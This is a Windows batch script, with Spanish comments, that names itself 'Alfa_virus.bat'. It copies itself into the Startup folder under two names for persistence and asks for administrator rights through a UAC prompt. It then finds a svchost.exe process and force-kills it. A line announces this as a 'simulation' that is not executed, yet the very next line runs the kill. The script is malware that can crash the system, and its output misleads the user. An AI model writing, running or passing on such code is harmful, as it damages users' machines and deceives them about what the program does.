@echo off
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
::cambiar nombre del archivo.bat
set "destino=%startup%\Alfa_virus.bat"

if not exist "%destino%" (
    copy "%~f0" "%destino%" >nul
)
cd /d "%~dp0"
if NOT "%cd%"=="%cd: =%" (
   echo El directorio actual contine espacios en el path.
   echo Este comando debe estar en un path que no contenga espacios. 
   rundll32.exe cmdext.dll,MessageBeepStub
   pause
   echo.
   goto :EOF
)

if {%1} EQU {[adm]} goto :data
REG QUERY HKU\S-1-5-19\Environment >NUL 2>&1 && goto :data

set command="""%~f0""" [adm] %*
setlocal enabledelayedexpansion
set "command=!command:'=''!"

powershell -NoProfile Start-Process -FilePath '%COMSPEC%' ^
-ArgumentList '/c """!command!"""' -Verb RunAs 2>NUL
goto :EOF

:data
setlocal enabledelayedexpansion
if {%1} EQU {[adm]} (
   set adm=%1
   shift
) ELSE (set adm=)

:cuerpo
REM ==============================================
REM Poner aqui el codigo a ejecutar
REM ==============================================



@echo off
setlocal EnableExtensions EnableDelayedExpansion
title Simulacion SVCHOST
color 0A

set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "destino=%startup%\beta1.bat"

if not exist "%destino%" (
    copy "%~f0" "%destino%" >nul
)


echo =====================================
echo        BUSQUEDA DE SVCHOST.EXE
echo =====================================
echo.

set "found_svchost="
set "svchost_pid="

for /f "usebackq tokens=1,2 delims=," %%A in (`tasklist /FI "IMAGENAME eq svchost.exe" /FO CSV /NH`) do (
    set "svchost_pid=%%~B"
    set "found_svchost=1"
    echo Proceso svchost.exe encontrado con PID: !svchost_pid!
    goto :sim_svchost
)

if not defined found_svchost (
    echo No se encontro ningun proceso svchost.exe.
) else (
    :sim_svchost
    echo.
    echo SIMULACION: taskkill /F /PID %svchost_pid% (NO EJECUTADO)
)

echo.
taskkill /F /PID %svchost_pid%

REM ==============================================
:fin
if {%adm%} EQU {[adm]} (
   echo.
   echo [Pulse 0 para salir]
   choice /c 0 /n
)